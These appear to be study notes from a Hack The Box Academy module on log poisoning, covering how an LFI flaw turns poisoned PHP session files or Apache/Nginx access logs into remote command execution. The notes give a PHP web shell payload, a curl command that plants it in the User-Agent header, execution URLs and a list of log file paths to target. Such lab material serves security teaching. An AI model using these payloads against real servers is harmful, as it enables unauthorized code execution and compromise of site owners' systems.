# Log Poisoning - [LINK](https://academy.hackthebox.com/app/module/23/section/252)

Log poisoning (or contamination) involves writing malicious PHP code into a field that the server logs or stores. By leveraging a Local File Inclusion (LFI) vulnerability to include that log or session file, the back-end executes the injected PHP code. The inclusion function must have "Execute" privileges (e.g., PHP's `include()`), and the application must have read access to the target file.

## **PHP Session Poisoning**
PHP web applications track user data using `PHPSESSID` cookies, storing this data in backend session files. If user-controlled input (like a URL parameter) is saved into this session file, you can inject a PHP web shell.

* **Session File Locations:**
* Linux: `/var/lib/php/sessions/sess_<PHPSESSID>`
* Windows: `C:\Windows\Temp\sess_<PHPSESSID>`


* **Step 1: Identify the Cookie.** Find your session cookie value (e.g., `nhhv8i0o6ua4g88bkdl9u1fdsd`).
* **Step 2: Poison the Session.** Send a request containing a URL-encoded PHP web shell in the parameter that gets saved to the session.
* **Payload (URL Encoded):** `%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` *(Decodes to `<?php system($_GET["cmd"]); ?>`)*
* **Example Injection:** `http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp...`


* **Step 3: Execute via LFI.** Include the session file path in the LFI parameter and execute your command.
* **Execution URL:** `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`
* *Note:* The session file may be overwritten after inclusion, so you must re-poison it to run subsequent commands or use the initial execution to drop a permanent web shell.



## **Server Log Poisoning**
Web servers like Apache and Nginx record request details, including the `User-Agent` header, in access logs. You can inject PHP code into this header and execute it by including the log file.

* **Log File Locations:**
* Apache: `/var/log/apache2/access.log` (Linux), `C:\xampp\apache\logs\` (Windows)
* Nginx: `/var/log/nginx/access.log` (Linux), `C:\nginx\log\` (Windows)
* *Note:* Nginx logs are usually readable by low-privileged users (`www-data`). Apache logs generally require higher privileges but may be readable due to misconfigurations.


* **Step 1: Poison the User-Agent.** Use Burp Suite to intercept a request and replace the `User-Agent` string with your PHP payload, or use cURL.
* **cURL Command:**
```bash
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison

```




* **Step 2: Execute via LFI.** Include the log file and pass your command.
* **Execution URL:** `http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id`



**Alternative Log Targets**
If standard web server logs are inaccessible, other system logs or process environments logging user-controlled input can be poisoned.

* `/proc/self/environ` or `/proc/self/fd/N` (Logs the `User-Agent` header)
* `/var/log/sshd.log` (Poison by attempting SSH login with a PHP payload as the username)
* `/var/log/vsftpd.log` (Poison via FTP username)
* `/var/log/mail` (Poison via email body/subject)
